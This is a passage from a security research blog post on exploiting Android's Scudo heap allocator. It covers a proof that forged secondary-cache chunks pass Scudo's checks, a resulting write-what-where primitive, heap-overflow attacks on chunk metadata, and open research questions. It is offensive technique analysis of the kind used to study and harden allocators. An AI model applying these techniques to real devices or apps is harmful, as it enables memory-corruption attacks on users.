</code></pre>Therefore, we check whether <code>CommitBase > CommitBase + CommitSize &lt;=> 0 > CommitSize</code>, which is impossible, as <code>CommitSize</code> is of type <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/internal_defs.h;l=81;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1" target=_blank rel=noopener><code>uptr = uintptr_t</code></a>
. To be precise, an unsigned comparison will be performed, i.e. for <code>r13 = AllocPos</code> and <code>rsi = CommitBase + CommitSize</code>:<pre tabindex=0><code>0x00007baef7fc0dc6 &lt;+182&gt;:	add    r13,0xffffffffffffffc0   // HeaderPos = AllocPos - 0x40
0x00007baef7fc0dca &lt;+186&gt;:	cmp    r13,rsi  // CommitBase - (CommitBase + CommitSize) = -CommitSize
0x00007baef7fc0dcd &lt;+189&gt;:	ja     0x7baef7fc0d80   // jump if CF=0 and ZF=0; we DONT want to jump here
</code></pre>For the above, <code>CF=1</code> as mathematically <code>CommitSize >= 0</code>. Hence, the fake chunk passes the first check.</li><li><a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=251;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>HeaderPos &lt; CommitBase || AllocPos > CommitBase + PageSize * MaxUnusedCachePages</code></a>
:<ol><li><code>HeaderPos &lt; CommitBase &lt;=> CommitBase &lt; CommitBase</code> is trivially false.</li><li>The second condition requires a bit more math:<pre tabindex=0><code>    AllocPos = CommitBase + 0x40
         &gt; CommitBase + PageSize * MaxUnusedCachePages
&lt;=&gt; 0x40 &gt; 0x1000 * 4
</code></pre>which is trivially false.</li></ol></li></ol><p>From now on we may assume that the fake chunk passed all the above tests, which implies that we reach the <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>assignment phase</a>
. Luckily, this phase does not modify <code>fake_entry.CommitBase</code> and <code>fake_entry.CommitSize</code> at all. Notice that the pointer to the header that <code>MapAllocatorCache::retrieve</code> returns is <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>HeaderPos</code></a>
, i.e. <code>CommitBase</code>.</p><p>Finally, the user data pointer will be computed <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=515;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>here</a>
(extremely simplified):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>return</span> <span class=n>H</span> <span class=o>+</span> <span class=n>LargeBlock</span><span class=o>::</span><span class=n>getHeaderSize</span><span class=p>();</span> <span class=c1>// = fake.CommitBase + 0x30
</span></span></span></code></pre></div><p>This is then used to compute the final user pointer <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=379" target=_blank rel=noopener><code>Ptr = fake.CommitBase + 0x30 + 0x10</code></a>
(again extremely simplified, but this is what actually happens when resolving alignment etc.).</p><p>Therefore, <code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40</code> (btw. this is totally a <a href=#neat-little-side-effect><em>Write - What - Where</em> condition</a>
).</p><h5 id=neat-little-side-effect>Neat Little Side Effect</h5><p>The attentive reader might have noticed that the previous proof, dispite being a mathematical disaster, implies that an attacker can control where the chunk is returned to by setting <code>fake.CommitBase</code> accordingly.</p><p>Theoretically speaking, let <code>target_addr</code> be the address we want to write data to. Also, we assume that the cache is not emptied. If the cache is emptied while the fake chunk is cached, <code>munmap</code> will either return an error, which in turn results in an abort, or will unmap a region that is in use, therefore eventually causing a segmentation fault. Thus, the probability of the following attack to succeed decreases with increasing amount of bytes to write!</p><p>From <code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40</code> we get that the <code>LargeBlock::Header</code> is stored at a chosen <code>fake.CommitBase</code>. As we cannot control the contents of <code>fake.Prev</code> and <code>fake.Next</code>, because they will be overwritten, we have to stick with <code>fake.MapBase</code> and <code>fake.MapSize</code>. It should also be possible to use the <code>fake.CommitSize</code> field, but we will ignore it for now, because it will be modified by a <code>+ 0x40</code>, which has to be considered when calling <code>free</code> in order to bypass the checks.</p><p>Now, choosing <code>fake.CommitBase = target_addr + offset(LargeBlock::Header::MapBase) = target_addr + 0x20</code> results in a 16 byte write at <code>target_addr</code>. Of course this is limited by the fact that a thread allocating enough memory to trigger the secondary will try to use the allocated memory (otherwise, why would a thread allocate memory at all?). Therefore, this <em>Write - What - Where</em> condition is constrained by the fact that whereever we write, consecutive memory is most likely overwritten by the allocating thread.</p><h3 id=heap---based-meta-data-overflow>Heap - based Meta Data Overflow</h3><p>Up to this point, we have only seen fake chunk creation for <a href=#primary-poisoning>primary</a>
and <a href=#secondary-cache-poisoning>secondary</a>
and a small <a href=#neat-little-side-effect><em>Write - What - Where</em> condition</a>
. Now one might ask: What if there is a buffer overflow into a consecutive chunk?</p><p>First, lets agree on focussing on primary allocations. The reason is that secondary allocations will initially be performed via <code>mmap</code> and therefore include a portion of randomness as regards their addresses. Of course, the primary also utilizes randomness to especially make heap - based overflows harder. I.e. the primary <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=388;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener>shuffles</a>
the chunks w.r.t. a class id. This means that for some index <code>i</code> we get that with high probability <code>malloc_i(size) != malloc_i+1(size) - (header_size + padding + size) = malloc_i+1(size) - 0x20</code>.</p><p>This leaves us with either trying to attack the randomness (e.g. via side channel attacks) or creating two consecutive fake chunks with the property that one chunk can overflow into the other chunk. As attacks on randomness are pretty hard (i.e. mathematical) this will be postponed and tagged as <a href=#future-work>future work</a>
.</p><p>Lets assume that we introduced two fake chunks, named <code>first</code> and <code>second</code>, with the following properties:</p><ol><li>the fake chunks are of the same size (primary)</li><li>there exists an index <code>i</code> s.t. <code>C->Chunks[i] = first</code> and <code>C->Chunks[i+1] = second</code></li><li>there is no interference by other threads</li><li><code>first</code> and <code>second</code> are successive in memory, i.e. <code>addr(first) + 0x20 = addr(second)</code></li><li>there exists functionality in the target app that will allocate both chunks, trigger a buffer overflow from <code>first</code> into <code>second</code>, and <code>second</code> contains &ldquo;important&rdquo; information</li></ol><p>To be precise, it only really matters that property 5 is given, i.e. we technically do not need property 2. Although the problem that arises is that the functionality that triggers the overflow will have to perform a certain (maybe random) amount of allocations after allocating <code>first</code> until it allocates <code>second</code>, therefore decreasing success probability. Determining the amount of allocations could require restarting the app over and over again with increasing number of allocations, or in the worst case boil down to guessing.</p><p>Assuming the above properties, the remaining issue is that overwriting meta data of <code>second</code> in <em>Scudo</em> will abort the app if <code>free(second)</code> is called and there is a checksum mismatch. Therefore, we need to know the pointer of <code>second</code> and <strong>a</strong> value for <code>Cookie</code> in order to properly compute the checksum. If, however, the goal is to get the overflow into &ldquo;important&rdquo; user data (which might even allow to overwrite the <code>.got</code> entry of <code>free</code>), then an attacker will be allowed to overflow with the above assumptions.</p><h2 id=future-work>Future Work</h2><p>In this section, unanswered questions and unsolved problems are listed for future work! Either they seemed to hard at first glance or were considered &ldquo;useless&rdquo; at that point in time.</p><ol><li>Evaluate integer underflow in <a href=#fake-chunk-mispositioning>primary poisoning</a>
. It somehow feels like there has to be more that can be done&mldr;</li><li>Evaluate <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1116;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>getBlockBegin</code></a>
. To be precise: how can the <code>Offset</code> field be used? Memory probing??</li><li>Attack: Primary fake chunk creation to construct predictable order and locations of primary chunks. I.e. calling <code>free</code> repeatedly for consecutive memory allows to fill up <code>C->Chunks</code> in non - shuffled fashion! Problem: strong assumptions</li><li>Evaluate integer underflow caused by calling <code>DoublyLinkedList::remove</code> with <code>X->Next = X->Prev = X</code>. Maybe side channel?? (very unlikely, but would be funny). <code>DoublyLinkedList::Size</code> impacts <code>DoublyLinkedList::empty()</code>, which impacts <code>scudo_malloc_info</code>. Might be useful to confuse programs&mldr;</li><li>What happens if the quarantine and memory tagging are enabled? How does that impact the proposed attacks?</li><li>It seems to be possible to render the secondary cache useless by freeing fake chunks with <code>CommitSize = &lt;size smaller than primary sizes></code> and <code>CommitBase != nullptr</code>, as we <strong>dont</strong> have control over the <code>ClassId</code> field for <code>scudo_malloc</code> calls. This could enforce secondary allocations to use <code>mmap</code> and <code>munmap</code>. This might be limited by the fact that the cache can be emptied if it is full.</li><li>Evaluate attacks on randomness as regards chunk ordering in the primary. It suffices to know that two chunks in a chunk array are consecutive in terms of array positioning and memory location. Dissolving the entire shuffling of a chunks array would be amazing, but way too much. If we knew that the next to calls to <code>malloc</code> result in two successive chunks in terms of memory location, then we could trigger a behaviour that again triggers a buffer overflow w.r.t. the two chunks. If we only had an oracle that tells us whether the next two calls to <code>malloc</code> return successive chunks in memory, then we could test for this property and if its not given, then perform a (maybe random) sequence of <code>malloc</code> and <code>free</code> calls to &ldquo;shuffle&rdquo; the array. Then repeat.</li></ol><h2 id=summary>Summary</h2><p>We have seen different kinds of attacks on vulnerabilities that involve <em>Scudo</em>. To be precise, we have seen two types of fake chunk creation, namely <a href=#primary-poisoning><em>Primary Poisoning</em></a>
and <a href=#secondary-cache-poisoning><em>Secondary Cache Poisoning</em></a>
, as well as a <a href=#neat-little-side-effect><em>Write - What - Where</em> condition</a>
, which was a side effect of <em>Secondary Cache Poisoning</em>. Finally, heap overflows into chunk meta data have been discussed.</p><p>Overall, we can say that with strong enough assumptions, i.e. leak of a pointer and a combined header, and presence of a <em>Scudo</em> - related vulnerability, we can perform similar attacks to those applicable to e.g. <em>dlmalloc</em>. Currently, the main assumption is the leak in order to break the checksum. Further analysis is required to determine whether this leak is a globally minimal assumption, or whether the assumption can be dropped or replaced by a weaker one.</p></article></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2022 - 2026 lolcads</div><div class="flex flex-row"><span class="ml-0 pl-0 md:ml-2 md:pl-2 border-l-0 md:border-l border-slate-300 dark:border-slate-400">Powered by <a href=https://gohugo.io target=_blank rel=noopener class=underline>Hugo</a> <span class=text-red-600>&#9829;</span> <a href=https://github.com/tomowang/hugo-theme-tailwind target=_blank rel=noopener class=underline>Tailwind</a></span></div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>